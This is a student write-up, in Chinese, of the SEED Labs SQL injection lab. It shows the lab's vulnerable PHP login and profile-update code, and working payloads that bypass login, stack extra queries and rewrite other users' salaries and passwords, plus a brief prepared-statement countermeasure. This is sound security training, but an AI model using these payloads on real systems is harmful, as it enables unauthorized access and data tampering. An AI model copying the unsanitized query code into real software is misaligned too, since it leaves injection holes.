# SQL Injection Attack Lab



## Lab Tasks



### Task 1: Get Familiar with SQL Statements

登录mysql

`$ mysql -u root -pseedubuntu`

![image-20201020080042446](https://gitee.com/ethustdout/pics/raw/master/img/image-20201020080042446.png)

加载数据库

`$ use Users `

![image-20201020080142652](https://gitee.com/ethustdout/pics/raw/master/img/image-20201020080142652.png)

显示表

`$ show tables`

![image-20201020080232803](https://gitee.com/ethustdout/pics/raw/master/img/image-20201020080232803.png)

获取Alice的相关信息

`select * from credential where Name='Alice'`

![image-20201020080412948](https://gitee.com/ethustdout/pics/raw/master/img/image-20201020080412948.png)



### Task 2: SQL Injection Attack on SELECT Statement



#### Task 2.1: SQL Injection Attack from webpage

web端php源码

```php
$input_uname = $_GET['username'];
$input_pwd = $_GET['Password'];
$hashed_pwd = sha1($input_pwd);

$sql = "SELECT id, name, eid, salary, birth, ssn, phoneNumber, address, email,nickname,Password
      FROM credential
      WHERE name= '$input_uname' and Password='$hashed_pwd'";
```

没有对`username`字段做任何限制，使用`'`闭合前面的`'`，使用`#`注释掉后面的语句，

使用用户名`admin'#` ，拼接后的sql语句为

```mysql
SELECT id, name, eid, salary, birth, ssn, phoneNumber, address, email,nickname,Password
      FROM credential
      WHERE name= 'admin'#' and Password='$hashed_pwd'
```



![image-20201020080757376](https://gitee.com/ethustdout/pics/raw/master/img/image-20201020080757376.png)

`login`之后，成功

![image-20201020080820634](https://gitee.com/ethustdout/pics/raw/master/img/image-20201020080820634.png)





#### Task 2.2: SQL Injection Attack from command line.

在终端输入

```bash
[10/20/20]seed@VM:~$ curl 'http://www.seedlabsqlinjection.com/unsafe_home.php?username=admin%27%23&Password=a'
```



![image-20201020081702459](https://gitee.com/ethustdout/pics/raw/master/img/image-20201020081702459.png)

把数据保存下来，用浏览器打开后结果和上面一样



#### Task 2.3: Append a new SQL statement

由于sql语句用的是query，不能多语句查询，修改源码（

```php
[-]      if (!$result = $conn->query($sql)) {
[+]      if (!$result = $conn->multi_query($sql)) {
```

在输入框中，输入

`Alice'; use abc; insert into aaa(username) values ('stdout'); #`

其中abc是自己创建的数据库（为了方便

![image-20201020085651681](https://gitee.com/ethustdout/pics/raw/master/img/image-20201020085651681.png)

进到数据库，查看结果

![image-20201020085711421](https://gitee.com/ethustdout/pics/raw/master/img/image-20201020085711421.png)

插入成功



###  Task 3: SQL Injection Attack on UPDATE Statement



#### **Task 3.1: Modify your own salary**. 

```php
$hashed_pwd = sha1($input_pwd);
$sql = "UPDATE credential SET
nickname=’$input_nickname’,
email=’$input_email’,
address=’$input_address’,
PhoneNumber=’$input_phonenumber’
WHERE ID=$id;";
$conn->query($sql);
```

`?NickName=aaa',salary=114514 where id=1;#`

之后的sql语句为`UPDATE credential SET nickname='aaa', salary=114514 where id=1;#',email='',address='',PhoneNumber='' where ID=1; `

运行之后，成功修改工资为`114514`

![image-20201020091708754](https://gitee.com/ethustdout/pics/raw/master/img/image-20201020091708754.png)



#### Task 3.2: Modify other people’ salary.

老板怎么能这么多工资呢，这样下去不行的，让我们来改成1吧（万恶的资本家）

`NickName=shabi',salary=1 where Name='Boby';#`

sql语句为`UPDATE credential SET nickname='shabi',salary=1 where id=2;#',email='',address='',PhoneNumber='' where ID=1; `

运行之后，修改成功

![image-20201020092220876](https://gitee.com/ethustdout/pics/raw/master/img/image-20201020092220876.png)



```php
$sql = "UPDATE credential SET nickname='$input_nickname',email='$input_email',address='$input_address',Password='$hashed_pwd',PhoneNumber='$input_phonenumber' where ID=$id;";
```



#### **Task 3.3: Modify other people’ password**. 

原密码

![image-20201020093627863](https://gitee.com/ethustdout/pics/raw/master/img/image-20201020093627863.png)

传入参数

![image-20201020093737854](https://gitee.com/ethustdout/pics/raw/master/img/image-20201020093737854.png)

新密码

![image-20201020093752864](https://gitee.com/ethustdout/pics/raw/master/img/image-20201020093752864.png)



密码`0xDktb`登录成功

![image-20201020095520413](https://gitee.com/ethustdout/pics/raw/master/img/image-20201020095520413.png)



### Task 4: Countermeasure — Prepared Statement

使用预编译防止sql注入

可以见到防止了sql注入攻击

![image-20201020095947604](https://gitee.com/ethustdout/pics/raw/master/img/image-20201020095947604.png)

